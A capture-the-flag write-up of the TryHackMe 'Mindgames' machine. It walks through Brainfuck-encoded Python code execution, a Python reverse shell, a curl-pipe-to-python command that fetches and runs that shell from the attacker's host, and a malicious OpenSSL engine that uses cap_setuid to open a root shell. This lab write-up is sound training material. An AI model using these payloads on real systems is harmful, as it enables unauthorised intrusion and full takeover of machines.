# CTF Write-up: Mindgames — TryHackMe

| | |
|---|---|
| **Platform**   | TryHackMe |
| **Machine**    | Mindgames |
| **Difficulty** | Medium |
| **Tags**       | `Brainfuck` `Python RCE` `Capabilities` `OpenSSL` |

---

## Introduction

Mindgames is one of the more creative boxes I've done on TryHackMe. The initial foothold is genuinely unique — instead of handing you a traditional exploit, the box forces you to think about encoding and execution in a way that most beginner rooms don't. The privilege escalation is equally unconventional. If you've never touched Linux capabilities before, this room is a great introduction.

---

## Step 1 — Reconnaissance (Nmap)

Standard Nmap scan to start:

```bash
nmap -sC -sV -oN nmap_scan.txt <target-ip>
```

Only two ports open:

- **Port 22** — SSH (OpenSSH)
- **Port 80** — HTTP

No FTP, no weird services — just a web app. SSH without credentials is a dead end for now so I went straight to the browser.

---

## Step 2 — Web Enumeration

The homepage immediately stands out. The page is covered in strange symbols — it's Brainfuck, an esoteric programming language made up of only eight characters. The page actually has two examples already on display, and at the bottom there's an input box that lets you submit code to be run.

I also ran Gobuster in the background but it didn't find anything of note. The code execution box on the homepage was clearly the way in.

I used an online Brainfuck decoder to read the two examples on the page. Both decoded to Python programs — one printed "Hello World" and the other did some basic arithmetic. This was the clue: the web app was executing Python code encoded as Brainfuck.

---

## Step 3 — Testing Code Execution

To confirm this, I tried submitting plain Python code first:

```python
print("test")
```

Nothing happened. The input needed to be Brainfuck-encoded for it to execute. Using the same online encoder, I encoded a simple print statement, submitted it, and got output back. Code execution confirmed.

Now I just needed to turn that into something more useful.

---

## Step 4 — Remote Code Execution → Reverse Shell

I crafted a Python one-liner that uses the `os` module to run system commands:

```python
__import__("os").system("id")
```

Encoded that in Brainfuck, pasted it in, clicked run — and got the output of `id` back on the page. Full RCE.

From there I moved to a proper reverse shell. I wrote a Python reverse shell script and saved it as `rev.py` on my machine:

```python
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("<your-ip>", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
```

Started a Python HTTP server to serve the file:

```bash
python3 -m http.server 8000
```

Started a Netcat listener:

```bash
nc -nvlp 4444
```

Then encoded and submitted this payload:

```python
__import__("os").system("curl http://<your-ip>:8000/rev.py | python3")
```

The shell popped on my listener. Grabbed the user flag from the Mindgames home directory:

```bash
cat /home/mindgames/user.txt
```

> **FLAG:** `[user flag here]`

---

## Step 5 — Privilege Escalation (OpenSSL Capabilities)

Ran LinPEAS to do a thorough sweep of the system. Most output was clean, but one entry jumped out:

```
/usr/bin/openssl = cap_setuid+ep
```

OpenSSL had the `cap_setuid` capability set — meaning it can change its UID to any user, including root. This is an uncommon privesc vector and easy to miss if you're only looking at SUID binaries or sudo rules.

The exploit works by creating a custom OpenSSL engine (a shared library) that calls `setuid(0)` and then spawns a bash shell. I wrote the C code:

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id) {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```

Compiled it on my attack machine (needs `libssl-dev` installed):

```bash
gcc -fPIC -o root.o -c root.c && gcc -shared -o root.so -lcrypto root.o
```

Transferred `root.so` to the target and executed it:

```bash
openssl engine -t -c `pwd`/root.so
```

A root shell opened immediately.

```bash
whoami
# root
```

---

## Step 6 — Root Flag

```bash
cat /root/root.txt
```

> **FLAG:** `[root flag here]`

---

## Summary & Takeaways

Mindgames earns its name. The attack path:

1. Brainfuck-encoded Python execution on the web app.
2. Encoded RCE payload to curl and execute a reverse shell.
3. OpenSSL with `cap_setuid` capability allowed full UID change.
4. Custom OpenSSL engine compiled and loaded to pop a root shell.

The capability-based privesc is a great reminder that SUID binaries aren't the only thing worth looking for. Always check capabilities with `getcap -r / 2>/dev/null` during enumeration.
